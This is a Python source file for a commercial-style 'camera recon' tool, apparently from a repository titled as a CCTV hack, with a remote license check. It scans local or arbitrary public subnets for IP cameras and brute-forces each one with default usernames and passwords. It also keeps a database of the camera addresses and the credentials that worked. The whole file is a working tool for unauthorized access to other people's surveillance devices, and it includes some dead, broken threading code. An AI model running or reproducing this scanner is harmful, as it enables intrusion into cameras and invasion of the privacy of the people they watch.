#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Arman Ultimate Pro Camera Recon & Gateway Tool
Author: Arman Yb
GitHub: github.com/Armanyb1
Telegram: @Armanyb
"""

import socket
import requests
from requests.auth import HTTPBasicAuth
import threading
from queue import Queue
import ipaddress
from datetime import datetime
import time
import sys
import os
import uuid

try:
    from colorama import Fore, Style, init
    init(autoreset=True)
    HAS_COLOR = True
except ImportError:
    HAS_COLOR = False
    class Fore:
        GREEN = '\033[92m'
        RED = '\033[91m'
        YELLOW = '\033[93m'
        CYAN = '\033[96m'
        WHITE = '\033[97m'
    class Style:
        RESET_ALL = '\033[0m'

REMOTE_LICENSE_URL = "https://raw.githubusercontent.com/Armanyb1/Cc-tv-Hack-YB/refs/heads/main/keys.txt"

socket.setdefaulttimeout(0.3)
detected_ips = set()
stop_scan = False
scan_results = []
PERSISTENT_FILE = "arman_live_cameras.txt"

def get_hwid():
    device_id_path = "/data/data/com.termux/files/home/.device_id"
    try:
        if os.path.exists(device_id_path):
            with open(device_id_path, "r") as f:
                return f.read().strip()
        else:
            short_id = str(uuid.uuid4()).split('-')[0].upper()
            hwid = f"ARMAN-{short_id}"
            with open(device_id_path, "w") as f:
                f.write(hwid)
            return hwid
    except:
        return "ARMAN-PRO-ID"

def verify_online_license():
    print(f"\n{Fore.CYAN}{'='*50}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}[*] Verifying Online License...{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*50}{Style.RESET_ALL}\n")
    
    current_hwid = get_hwid()
    try:
        url_with_cache_buster = f"{REMOTE_LICENSE_URL}?t={int(time.time())}"
        response = requests.get(url_with_cache_buster, timeout=10)
        if response.status_code != 200:
            print(f"{Fore.RED}[❌] Connection Error to License Server.{Style.RESET_ALL}")
            sys.exit(1)
            
        license_data = response.text.strip().splitlines()
        authorized = False
        
        for line in license_data:
            if not line or line.startswith('#'): continue
            parts = line.strip().split('|')
            if len(parts) >= 2:
                if parts[0].strip().upper() == current_hwid:
                    if parts[1].strip().upper() in ["LIFETIME", "BLOCKED"]:
                        if parts[1].strip().upper() == "BLOCKED":
                            print(f"{Fore.RED}[❌] Access Blocked by Admin!{Style.RESET_ALL}")
                            sys.exit(1)
                        authorized = True
                        break
                    else:
                        try:
                            if datetime.now() <= datetime.strptime(parts[1].strip().upper(), "%Y-%m-%d"):
                                authorized = True
                                break
                        except:
                            pass
                            
        if authorized:
            print(f"{Fore.GREEN}[✓] Access Granted! Status: Active{Style.RESET_ALL}")
            time.sleep(1)
            return True
        else:
            print(f"{Fore.RED}[❌] Access Denied: HWID not registered!{Style.RESET_ALL}")
            sys.exit(1)
    except:
        print(f"{Fore.RED}[❌] Network Error.{Style.RESET_ALL}")
        sys.exit(1)

def print_banner():
    banner = f"""
╔═══════════════════════════════════════════════════╗
║   Arman Ultimate Pro Camera Recon & Gateway Tool  ║
║   Fast Discovery, Progress Bar & Deep Banner DB   ║
║   Telegram: @Armanyb                              ║
╚═══════════════════════════════════════════════════╝
"""
    print(f"{Fore.CYAN}{banner}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}[*] Developer: {Fore.YELLOW}Arman Yb{Style.RESET_ALL}\n")

def get_router_brand(gateway_ip):
    try:
        res = requests.get(f"http://{gateway_ip}", timeout=1.5)
        text = res.text.lower()
        headers = str(res.headers).lower()
        combined = text + headers
        if "tp-link" in combined: return "TP-Link Router"
        elif "tenda" in combined: return "Tenda Router"
        elif "huawei" in combined: return "Huawei Router"
        elif "d-link" in combined: return "D-Link Router"
        elif "mikrotik" in combined: return "MikroTik Router"
        elif "netgear" in combined: return "Netgear Router"
        else: return f"Generic Router (Server: {res.headers.get('Server', 'Unknown')})"
    except:
        return "Gateway Active (Web UI Protected/Closed)"

def get_local_ip_and_gateway():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        subnet = ".".join(local_ip.split(".")[:3]) + "."
        gateway_ip = subnet + "1"
        router_info = get_router_brand(gateway_ip)
        return local_ip, gateway_ip, subnet, router_info
    except:
        return "192.168.1.100", "192.168.1.1", "192.168.1.", "Unknown Router"

def check_default_credentials(url):
    common_credentials = [
        ("admin", "admin"),
        ("admin", "12345"),
        ("admin", "123456"),
        ("admin", "password"),
        ("admin", "1234"),
        ("root", "root"),
        ("admin", "")
    ]
    
    for username, password in common_credentials:
        try:
            res = requests.get(url, auth=HTTPBasicAuth(username, password), timeout=1.5)
            if res.status_code == 200:
                if "login" not in res.text.lower() and "unauthorized" not in res.text.lower():
                    return f"{username}:{password}"
        except:
            pass
    return "Protected / Unknown"

def save_to_persistent_storage(res):
    try:
        existing_entries = set()
        if os.path.exists(PERSISTENT_FILE):
            with open(PERSISTENT_FILE, "r", encoding="utf-8") as f:
                existing_entries = set(f.read().splitlines())
                
        entry_line = f"{res['ip']}:{res['port']} | {res['type']} | URL: {res['url']} | Auth: {res['creds']} | Time: {datetime.now().strftime('%Y-%m-%d %H:%M')}"
        
        ip_check = f"{res['ip']}:{res['port']}"
        is_duplicate = any(ip_check in line for line in existing_entries)
        
        if not is_duplicate:
            with open(PERSISTENT_FILE, "a", encoding="utf-8") as f:
                f.write(entry_line + "\n")
            print(f"\n{Fore.CYAN}[💾 Saved to DB]: {entry_line}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[!] Error saving to DB: {e}{Style.RESET_ALL}")

def scan(ip, port):
    global stop_scan
    if stop_scan: return
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.connect((ip, port))
            sock.send(b'GET / HTTP/1.1\r\nHost: local\r\n\r\n')
            response = sock.recv(4096).decode()
            url = f"http://{ip}:{port}" if port != 80 else f"http://{ip}"
            
            camera_found = False
            cam_type = "Unknown Camera"
            
            resp_lower = response.lower()
            server_header = "Unknown"
            for line in response.split('\r\n'):
                if line.lower().startswith('server:'):
                    server_header = line.split(':', 1)[1].strip()
                    break

            # Deep Banner Grabbing & Signature Checks
            if 'goahead' in resp_lower or 'goahead-webs' in resp_lower:
                camera_found = True
                cam_type = f"IP Camera (GoAhead Web Server - {server_header})"
            elif 'app-webs' in resp_lower:
                camera_found = True
                cam_type = f"IP Camera (App-Webs - {server_header})"
            elif 'dahua' in resp_lower:
                camera_found = True
                cam_type = f"Dahua Camera ({server_header})"
            elif 'hikvision' in resp_lower or 'hik-connect' in resp_lower:
                camera_found = True
                cam_type = f"Hikvision Camera ({server_header})"
            elif 'boa' in resp_lower:
                camera_found = True
                cam_type = f"IP Camera (Boa Server - {server_header})"
            elif 'login' in resp_lower or 'camera' in resp_lower or 'surveillance' in resp_lower or port in [554, 8000, 37777]:
                camera_found = True
                cam_type = f"Generic IP Camera/Device ({server_header})"
                
            if camera_found and ip not in detected_ips:
                detected_ips.add(ip)
                creds = check_default_credentials(url)
                
                result_item = {
                    "ip": ip,
                    "port": port,
                    "type": cam_type,
                    "url": url,
                    "creds": creds
                }
                scan_results.append(result_item)
                save_to_persistent_storage(result_item)
                
                print(f"\n{Fore.GREEN}[✓] Found Active Camera: {cam_type} | IP: {ip}:{port} | Creds: {creds}{Style.RESET_ALL}")
    except:
        pass

def is_host_alive(ip):
    # Fast Host Discovery check on common ports
    for p in [80, 443, 8080, 554, 8000, 37777]:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(0.1)
                if s.connect_ex((ip, p)) == 0:
                    return True
        except:
            pass
    return False

def get_ports_from_user():
    print(f"\n{Fore.YELLOW}Select Port Options:{Style.RESET_ALL}")
    print("1. Default Ports (80, 8080, 554, 8000, 37777)")
    print("2. Enter Custom Ports (e.g. 80,554)")
    choice = input(f"{Fore.GREEN}Choose port option (1-2): {Style.RESET_ALL}").strip()
    
    if choice == '2':
        custom_input = input(f"{Fore.GREEN}Enter ports separated by comma (e.g. 80,8080,554): {Style.RESET_ALL}").strip()
        try:
            ports = [int(p.strip()) for p in custom_input.split(',')]
            return ports
        except:
            print(f"{Fore.RED}[!] Invalid port format. Using default ports.{Style.RESET_ALL}")
    
    return [80, 8080, 554, 8000, 37777]

def update_progress(completed, total):
    percent = int((completed / total) * 100)
    filled = int(percent / 10)
    bar = '█' * filled + '░' * (10 - filled)
    sys.stdout.write(f"\r{Fore.YELLOW}[{bar}] {percent}% Completed ({completed}/{total} IPs Checked){Style.RESET_ALL}")
    sys.stdout.flush()

def run_scanner_engine(subnet, ports_to_check):
    global stop_scan, scan_results
    stop_scan = False
    scan_results = []
    detected_ips.clear()
    
    print(f"\n{Fore.CYAN}[*] Step 1: Running Fast Host Discovery (Ping Check)...{Style.RESET_ALL}")
    live_hosts = []
    
    for i in range(1, 255):
        ip = f"{subnet}{i}"
        if is_host_alive(ip):
            live_hosts.append(ip)
            
    print(f"{Fore.GREEN}[✓] Host Discovery Completed! Active Hosts Found: {len(live_hosts)}{Style.RESET_ALL}\n")
    print(f"{Fore.CYAN}[*] Step 2: Scanning Ports & Deep Banner Grabbing on Active Hosts...{Style.RESET_ALL}\n")
    
    queue = Queue()
    for _ in range(50):
        t = threading.Thread(target=lambda q: [s for s in [q.get() and scan(s[0], s[1]) or q.task_done() for s in iter(q.get, None)]], daemon=True) # streamlined queue worker loop
        
    # Better thread worker:
    def worker(q):
        global stop_scan
        while not stop_scan:
            try:
                ip, port = q.get(timeout=0.5)
                scan(ip, port)
                q.task_done()
            except:
                if stop_scan: break

    for _ in range(40):
        threading.Thread(target=worker, args=(queue,), daemon=True).start()
        
    total_tasks = len(live_hosts) * len(ports_to_check)
    completed_tasks = 0
    
    if total_tasks == 0:
        print(f"{Fore.RED}[!] No active hosts to scan.{Style.RESET_ALL}")
        return

    for ip in live_hosts:
        for port in ports_to_check:
            queue.put((ip, port))
            
    while not queue.empty() and not stop_scan:
        done = total_tasks - queue.qsize()
        update_progress(done, total_tasks)
        time.sleep(0.3)
        
    print("\n")
    print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}              SCAN COMPLETED & SAVED TO DB                   {Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
    
    if scan_results:
        for idx, res in enumerate(scan_results, 1):
            print(f"{Fore.WHITE}[{idx}] Type : {res['type']}")
            print(f"    IP & Port : {res['ip']}:{res['port']}")
            print(f"    URL       : {res['url']}")
            print(f"    Auth/Pass : {res['creds']}")
            print(f"{'-'*60}")
    else:
        print(f"{Fore.RED}[!] No cameras or devices found in this scan range.{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}\n")

def run_local_scanner():
    local_ip, gateway_ip, subnet, router_info = get_local_ip_and_gateway()
    print(f"{Fore.YELLOW}[i] Your Local IP    : {local_ip}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[i] Router Gateway   : {gateway_ip}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[i] Router Brand Info: {router_info}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[i] Scanning Subnet  : {subnet}1 to {subnet}254{Style.RESET_ALL}")
    
    ports_to_check = get_ports_from_user()
    run_scanner_engine(subnet, ports_to_check)

def run_public_scanner():
    target_subnet = input(f"{Fore.GREEN}Enter Target Public Subnet Prefix (e.g. 103.102.25): {Style.RESET_ALL}").strip()
    if not target_subnet:
        target_subnet = "103.102.25"
        
    ports_to_check = get_ports_from_user()
    print(f"{Fore.YELLOW}[i] Scanning Public Subnet: {target_subnet}.1 to {target_subnet}.254{Style.RESET_ALL}")
    run_scanner_engine(target_subnet + ".", ports_to_check)

def view_saved_database():
    print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}        SAVED CAMERAS & CREDENTIALS DATABASE (DB)            {Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
    if os.path.exists(PERSISTENT_FILE):
        with open(PERSISTENT_FILE, "r", encoding="utf-8") as f:
            lines = f.read().splitlines()
            if lines:
                for idx, line in enumerate(lines, 1):
                    print(f"{Fore.WHITE}[{idx}] {line}{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[!] Database file is empty.{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}[!] No saved database found yet. Run a scan first!{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}\n")

def main():
    verify_online_license()
    print_banner()
    while True:
        print(f"\n{Fore.CYAN}=== MAIN MENU ===")
        print("1. Scan Local Wi-Fi (LAN) + Gateway Brand + Fast Ping + Progress Bar")
        print("2. Scan Public / ISP Subnet Range + Fast Ping + Progress Bar")
        print("3. View Saved Cameras Database (arman_live_cameras.txt)")
        print(f"4. Exit{Style.RESET_ALL}")
        
        choice = input(f"{Fore.GREEN}Select option (1-4): {Style.RESET_ALL}").strip()
        if choice == '1':
            run_local_scanner()
        elif choice == '2':
            run_public_scanner()
        elif choice == '3':
            view_saved_database()
        elif choice == '4':
            print(f"{Fore.YELLOW}[*] Exiting tool. Goodbye, Arman!{Style.RESET_ALL}")
            break
        else:
            print(f"{Fore.RED}[!] Invalid option! Choose between 1 to 4.{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
